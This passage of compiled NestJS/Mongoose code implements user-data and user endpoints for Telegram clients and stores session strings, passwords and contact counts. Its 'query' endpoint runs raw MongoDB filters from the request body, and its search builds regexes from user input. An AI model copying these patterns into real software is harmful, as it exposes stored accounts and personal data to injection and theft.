__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "callTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: [] }),
    __metadata("design:type", Array)
], UserData.prototype, "videos", void 0);
exports.UserData = UserData = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UserData);
exports.UserDataSchema = mongoose_1.SchemaFactory.createForClass(UserData);


/***/ }),

/***/ "./src/components/user-data/user-data.controller.ts":
/*!**********************************************************!*\
  !*** ./src/components/user-data/user-data.controller.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const create_user_data_dto_1 = __webpack_require__(/*! ./dto/create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const search_user_data_dto_1 = __webpack_require__(/*! ./dto/search-user-data.dto */ "./src/components/user-data/dto/search-user-data.dto.ts");
const update_user_data_dto_1 = __webpack_require__(/*! ./dto/update-user-data.dto */ "./src/components/user-data/dto/update-user-data.dto.ts");
const decorators_1 = __webpack_require__(/*! ../../decorators */ "./src/decorators/index.ts");
const interceptors_1 = __webpack_require__(/*! ../../interceptors */ "./src/interceptors/index.ts");
let UserDataController = class UserDataController {
    constructor(userDataService) {
        this.userDataService = userDataService;
    }
    async create(createUserDataDto) {
        return this.userDataService.create(createUserDataDto);
    }
    async search(query) {
        return this.userDataService.search(query);
    }
    async findAll() {
        return this.userDataService.findAll();
    }
    async updateAll(chatId, updateUserDataDto) {
        return this.userDataService.updateAll(chatId, updateUserDataDto);
    }
    async findOne(profile, chatId) {
        return this.userDataService.findOne(profile, chatId);
    }
    async update(profile, chatId, updateUserDataDto) {
        return this.userDataService.update(profile, chatId, updateUserDataDto);
    }
    async remove(profile, chatId) {
        return this.userDataService.remove(profile, chatId);
    }
    clearCount(chatId) {
        return this.userDataService.clearCount(chatId);
    }
    async executeQuery(requestBody) {
        try {
            const { query, sort, limit, skip } = requestBody;
            return await this.userDataService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UserDataController = UserDataController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data', description: 'Creates a new user data entry in the database.' }),
    (0, swagger_1.ApiBody)({ type: create_user_data_dto_1.CreateUserDataDto, description: 'User data to create' }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'User data successfully created.', type: user_data_schema_1.UserData }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input data.' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_data_dto_1.CreateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data', description: 'Searches user data based on provided query parameters.' }),
    (0, swagger_1.ApiQuery)({ name: 'profile', required: false, description: 'User profile identifier', type: String, example: 'user123' }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: false, description: 'Chat ID associated with the user', type: String, example: 'chat456' }),
    (0, swagger_1.ApiQuery)({ name: 'isTesting', required: false, description: 'Filter for testing users', type: Boolean, example: true }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, description: 'Filter for banned users', type: Boolean, example: false }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'List of matching user data.', type: [user_data_schema_1.UserData] }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid query parameters.' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_data_dto_1.SearchDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data', description: 'Retrieves all user data entries from the database.' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'List of all user data.', type: [user_data_schema_1.UserData] }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findAll", null);
__decorate([
    (0, common_1.Patch)('updateAll/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update all user data by chat ID', description: 'Updates all user data entries associated with a specific chat ID.' }),
    (0, swagger_1.ApiParam)({ name: 'chatId', description: 'Chat ID to update user data for', type: String, example: 'chat456' }),
    (0, swagger_1.ApiBody)({ type: update_user_data_dto_1.UpdateUserDataDto, description: 'User data fields to update' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'User data successfully updated.', type: Object }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input data.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'No user data found for the given chat ID.' }),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "updateAll", null);
__decorate([
    (0, common_1.Get)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by profile and chat ID', description: 'Retrieves a specific user data entry by profile and chat ID.' }),
    (0, swagger_1.ApiParam)({ name: 'profile', description: 'User profile identifier', type: String, example: 'user123' }),
    (0, swagger_1.ApiParam)({ name: 'chatId', description: 'Chat ID associated with the user', type: String, example: 'chat456' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'User data found.', type: user_data_schema_1.UserData }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by profile and chat ID', description: 'Updates a specific user data entry identified by profile and chat ID.' }),
    (0, swagger_1.ApiParam)({ name: 'profile', description: 'User profile identifier', type: String, example: 'user123' }),
    (0, swagger_1.ApiParam)({ name: 'chatId', description: 'Chat ID associated with the user', type: String, example: 'chat456' }),
    (0, swagger_1.ApiBody)({ type: update_user_data_dto_1.UpdateUserDataDto, description: 'User data fields to update' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'User data successfully updated.', type: user_data_schema_1.UserData }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input data.' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by profile and chat ID', description: 'Deletes a specific user data entry identified by profile and chat ID.' }),
    (0, swagger_1.ApiParam)({ name: 'profile', description: 'User profile identifier', type: String, example: 'user123' }),
    (0, swagger_1.ApiParam)({ name: 'chatId', description: 'Chat ID associated with the user', type: String, example: 'chat456' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'User data successfully deleted.', type: user_data_schema_1.UserData }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'User data not found.' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "remove", null);
__decorate([
    (0, common_1.Get)('clear-count'),
    (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
    (0, decorators_1.NoCache)(),
    (0, swagger_1.ApiOperation)({ summary: 'Clear count for user data', description: 'Clears the count for user data, optionally filtered by chat ID.' }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: false, description: 'Chat ID to clear count for', type: String, example: 'chat456' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Count cleared successfully.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid chat ID.' }),
    __param(0, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", void 0)
], UserDataController.prototype, "clearCount", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query', description: 'Executes a custom MongoDB query with optional sorting, limiting, and skipping.' }),
    (0, swagger_1.ApiBody)({
        description: 'MongoDB query parameters',
        schema: {
            type: 'object',
            properties: {
                query: { type: 'object', description: 'MongoDB query object', example: { profile: 'user123' } },
                sort: { type: 'object', description: 'Sort criteria', example: { createdAt: -1 } },
                limit: { type: 'number', description: 'Maximum number of results', example: 10 },
                skip: { type: 'number', description: 'Number of results to skip', example: 0 }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Query executed successfully.', type: Object }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid query parameters.' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "executeQuery", null);
exports.UserDataController = UserDataController = __decorate([
    (0, swagger_1.ApiTags)('UserData of TG clients'),
    (0, common_1.Controller)('userData'),
    __metadata("design:paramtypes", [user_data_service_1.UserDataService])
], UserDataController);


/***/ }),

/***/ "./src/components/user-data/user-data.module.ts":
/*!******************************************************!*\
  !*** ./src/components/user-data/user-data.module.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const user_data_controller_1 = __webpack_require__(/*! ./user-data.controller */ "./src/components/user-data/user-data.controller.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let UserDataModule = class UserDataModule {
};
exports.UserDataModule = UserDataModule;
exports.UserDataModule = UserDataModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: user_data_schema_1.UserData.name, schema: user_data_schema_1.UserDataSchema, collection: "userData" }])
        ],
        controllers: [user_data_controller_1.UserDataController],
        providers: [user_data_service_1.UserDataService],
        exports: [user_data_service_1.UserDataService]
    })
], UserDataModule);


/***/ }),

/***/ "./src/components/user-data/user-data.service.ts":
/*!*******************************************************!*\
  !*** ./src/components/user-data/user-data.service.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var UserDataService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
let UserDataService = UserDataService_1 = class UserDataService {
    constructor(userDataModel) {
        this.userDataModel = userDataModel;
        this.callCounts = new Map();
        this.logger = new utils_1.Logger(UserDataService_1.name);
    }
    async create(createUserDataDto) {
        try {
            return await this.userDataModel.create(createUserDataDto);
        }
        catch (error) {
            throw new common_1.InternalServerErrorException((0, parseError_1.parseError)(error));
        }
    }
    async findAll(limit = 99) {
        return this.userDataModel.find().limit(limit).lean().exec();
    }
    async findOne(profile, chatId) {
        const user = await this.userDataModel.findOne({ profile, chatId }).lean().exec();
        if (!user) {
            throw new common_1.NotFoundException(`UserData with profile "${profile}" and chatId "${chatId}" not found`);
        }
        const currentCount = (this.callCounts.get(chatId) || 0) + 1;
        this.callCounts.set(chatId, currentCount);
        return { ...user, count: currentCount };
    }
    clearCount(chatId) {
        if (chatId) {
            this.callCounts.delete(chatId);
            return `Count cleared for chatId: ${chatId}`;
        }
        this.callCounts.clear();
        return 'All counts cleared.';
    }
    async update(profile, chatId, updateUserDataDto) {
        delete updateUserDataDto._id;
        delete updateUserDataDto.profile;
        delete updateUserDataDto.chatId;
        const updatedUser = await this.userDataModel
            .findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true })
            .lean()
            .exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UserData with profile "${profile}" and chatId "${chatId}" not found`);
        }
        return updatedUser;
    }
    async updateAll(chatId, updateUserDataDto) {
        delete updateUserDataDto._id;
        return this.userDataModel
            .updateMany({ chatId }, { $set: updateUserDataDto }, { upsert: true })
            .exec();
    }
    async remove(profile, chatId) {
        const botsService = (0, utils_1.getBotsServiceInstance)();
        if (botsService) {
            botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `Deleting UserData with profile ${profile} and chatId ${chatId}`);
        }
        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).lean().exec();
        if (!deletedUser) {
            throw new common_1.NotFoundException(`UserData with profile "${profile}" and chatId "${chatId}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        return this.userDataModel.find(filter).lean().exec();
    }
    async executeQuery(query, sort, limit, skip) {
        const startTime = Date.now();
        if (!query) {
            throw new common_1.BadRequestException('Query is invalid.');
        }
        try {
            let q = this.userDataModel.find(query);
            if (sort)
                q = q.sort(sort);
            if (limit)
                q = q.limit(limit);
            if (skip)
                q = q.skip(skip);
            const result = await q.lean().exec();
            this.logger.log(`Query Execution Duration: ${Date.now() - startTime}Ms`);
            return result;
        }
        catch (error) {
            throw new common_1.InternalServerErrorException((0, parseError_1.parseError)(error));
        }
    }
    async resetPaidUsers() {
        try {
            return await this.userDataModel.updateMany({ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }, {
                $set: {
                    totalCount: 10,
                    limitTime: Date.now(),
                    paidReply: true,
                },
            }).exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException((0, parseError_1.parseError)(error));
        }
    }
    async incrementTotalCount(profile, chatId, amount = 1) {
        const updatedUser = await this.userDataModel
            .findOneAndUpdate({ profile, chatId }, { $inc: { totalCount: amount } }, { new: true })
            .lean()
            .exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UserData with profile "${profile}" and chatId "${chatId}" not found`);
        }
        return updatedUser;
    }
    async incrementPayAmount(profile, chatId, amount) {
        const updatedUser = await this.userDataModel
            .findOneAndUpdate({ profile, chatId }, { $inc: { payAmount: amount } }, { new: true })
            .lean()
            .exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UserData with profile "${profile}" and chatId "${chatId}" not found`);
        }
        return updatedUser;
    }
    async updateLastActive(profile, chatId) {
        return this.userDataModel
            .findOneAndUpdate({ profile, chatId }, { $set: { lastActiveTime: new Date() } }, { new: true })
            .lean()
            .exec();
    }
    async findInactiveSince(date) {
        return this.userDataModel.find({ lastActiveTime: { $lt: date } }).lean().exec();
    }
    async findByPaymentRange(minAmount, maxAmount) {
        return this.userDataModel.find({ payAmount: { $gte: minAmount, $lte: maxAmount } }).lean().exec();
    }
    async bulkUpdateUsers(filter, update) {
        try {
            return await this.userDataModel.updateMany(filter, update, { upsert: true }).exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException((0, parseError_1.parseError)(error));
        }
    }
    async findActiveUsers(threshold = 30) {
        return this.userDataModel.find({ totalCount: { $gt: threshold } }).sort({ totalCount: -1 }).lean().exec();
    }
    async removeRedundantData() {
        const twoMonths = Date.now() - 60 * 24 * 60 * 60 * 1000;
        try {
            const result = await this.userDataModel
                .deleteMany({ lastMsgTimeStamp: { $lt: twoMonths }, payAmount: 0, canReply: 1 })
                .exec();
            return { deletedCount: result.deletedCount ?? 0 };
        }
        catch (error) {
            throw new common_1.InternalServerErrorException((0, parseError_1.parseError)(error));
        }
    }
    async resetUserCounts(profile, chatId) {
        return this.userDataModel
            .findOneAndUpdate({ profile, chatId }, {
            $set: {
                totalCount: 0,
                limitTime: new Date(),
                paidReply: false,
            },
        }, { new: true })
            .lean()
            .exec();
    }
};
exports.UserDataService = UserDataService;
exports.UserDataService = UserDataService = UserDataService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(user_data_schema_1.UserData.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], UserDataService);


/***/ }),

/***/ "./src/components/users/dto/create-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/create-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDto {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
        this.movieCount = 0;
        this.photoCount = 0;
        this.videoCount = 0;
        this.otherPhotoCount = 0;
        this.otherVideoCount = 0;
        this.ownPhotoCount = 0;
        this.ownVideoCount = 0;
        this.contacts = 0;
    }
}
exports.CreateUserDto = CreateUserDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Mobile number of the user', example: '917330803480' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Session information of the user', example: 'string' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'First name of the user', example: 'Praveen' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last name of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of channels', example: 56 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of personal chats', example: 74 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of messages', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Total number of chats', example: 195 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Timestamp of last active', example: '2024-06-03' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Telegram ID of the user', example: '2022068676' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'TwoFA status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Expiration status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'password', example: "pass" }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of movies', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Gender of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of contacts', example: 105 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Call details of the user',
        example: {
            outgoing: 1,
            incoming: 0,
            video: 1,
            chatCallCounts: [],
            totalCalls: 1,
        },
    }),
    __metadata("design:type", Object)
], CreateUserDto.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Call details of the user',
        example: []
    }),
    __metadata("design:type", Array)
], CreateUserDto.prototype, "recentUsers", void 0);


/***/ }),

/***/ "./src/components/users/dto/index.ts":
/*!*******************************************!*\
  !*** ./src/components/users/dto/index.ts ***!
  \*******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-user.dto */ "./src/components/users/dto/create-user.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./search-user.dto */ "./src/components/users/dto/search-user.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-user.dto */ "./src/components/users/dto/update-user.dto.ts"), exports);


/***/ }),

/***/ "./src/components/users/dto/search-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/search-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchUserDto {
}
exports.SearchUserDto = SearchUserDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Telegram ID' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by mobile number' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by twoFA status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Expiration status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by session' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by first name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by username' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
